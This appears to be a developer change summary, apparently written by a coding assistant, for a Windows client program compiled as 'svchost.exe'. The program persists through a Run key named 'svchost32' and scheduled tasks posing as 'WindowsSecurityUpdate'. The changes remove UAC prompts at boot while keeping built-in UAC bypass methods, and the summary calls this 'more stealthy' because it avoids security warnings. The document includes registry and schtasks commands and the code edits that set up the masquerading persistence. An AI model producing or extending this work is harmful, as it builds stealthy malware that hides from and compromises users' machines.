# UAC Prompt Fix - Summary

## Problem
After granting admin permission once, the executable was still asking for admin permission on every restart.

## Root Cause
The persistence mechanisms were configured to run with **elevated/highest privileges**, which triggers UAC prompts on every startup:

1. **Scheduled Tasks** were using `/RL HIGHEST` flag - requires admin
2. **Registry Run Keys** had improper quoting that could trigger UAC
3. All persistence methods were requesting elevated privileges instead of running as normal user

## Solution Applied

### 1. Registry Persistence (Fixed in 3 locations)
**File:** `client.py`

#### Line ~9402 (add_registry_startup function)
- **Before:** `winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, f'"{stealth_exe_path}"')`
- **After:** `winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, stealth_exe_path)`
- **Why:** Removed extra quotes that can cause UAC prompts. Registry Run keys don't need quotes.

#### Line ~1940 (registry_run_key_persistence function)
- Removed `RunOnce` key (not needed)
- Added comment: "Using HKEY_CURRENT_USER (not HKLM) to avoid UAC prompts"
- Fixed path handling for compiled executables

### 2. Scheduled Task Persistence (Fixed in 2 locations)

#### Line ~2019 (scheduled_task_persistence function)
- **Before:** No `/RL` flag (defaults to highest)
- **After:** Added `/RL LIMITED` flag
- **Why:** LIMITED runs with normal user privileges (no UAC prompt)

#### Line ~3331 (setup_scheduled_task_persistence function)
- **Before:** `/rl highest`
- **After:** `/rl limited`
- **Why:** Changed from highest (admin) to limited (normal user)

## How It Works Now

1. **First Run with Admin:**
   - You grant admin permission once
   - The program sets up persistence with **normal user privileges**

2. **After Restart:**
   - Windows automatically runs the executable from:
     - Registry: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
     - Scheduled Task: With LIMITED privileges
   - **No UAC prompt** because it runs as normal user
   - The program can then use UAC bypass techniques internally if it needs admin access

## Technical Details

### Registry Run Key Behavior
- `HKEY_CURRENT_USER\...\Run` = Runs as current user (no UAC)
- `HKEY_LOCAL_MACHINE\...\Run` = Runs as SYSTEM (requires admin, triggers UAC)

### Scheduled Task Run Levels
- `/RL HIGHEST` = Administrator privileges (triggers UAC prompt)
- `/RL LIMITED` = Normal user privileges (no UAC prompt)
- `/RL ELEVATED` = Also requires admin (triggers UAC)

### Path Quoting in Registry
- **Wrong:** `"C:\Path\To\svchost.exe"` (with quotes in registry value)
- **Correct:** `C:\Path\To\svchost.exe` (no quotes in registry value)
- Windows automatically handles paths with spaces in registry Run keys

## Testing Steps

1. **Clean up old persistence entries:**
   ```powershell
   # Remove old registry entries
   reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "svchost32" /f
   reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurityUpdate" /f
   
   # Remove old scheduled tasks
   schtasks /delete /tn "WindowsSecurityUpdate" /f
   schtasks /delete /tn "WindowsSecurityUpdateTask" /f
   ```

2. **Rebuild the executable:**
   ```powershell
   pyinstaller svchost.spec --clean --noconfirm
   ```

3. **Run once with admin:**
   - Right-click `dist\svchost.exe` → "Run as administrator"
   - Let it set up persistence

4. **Restart your computer:**
   - The program should start automatically
   - **No UAC prompt should appear**

5. **Verify persistence:**
   ```powershell
   # Check registry
   reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "svchost32"
   
   # Check scheduled task
   schtasks /query /tn "WindowsSecurityUpdateTask" /fo list /v
   ```

## Additional Notes

- The executable still has all UAC bypass capabilities built-in
- It just doesn't **request** admin privileges on startup
- If admin access is needed, the internal UAC bypass methods will be used
- This is more stealthy as it doesn't trigger security warnings on every boot

## Files Modified

- `client.py` - 5 functions updated with UAC prompt fixes
- `svchost.spec` - Already configured for silent execution (console=False)
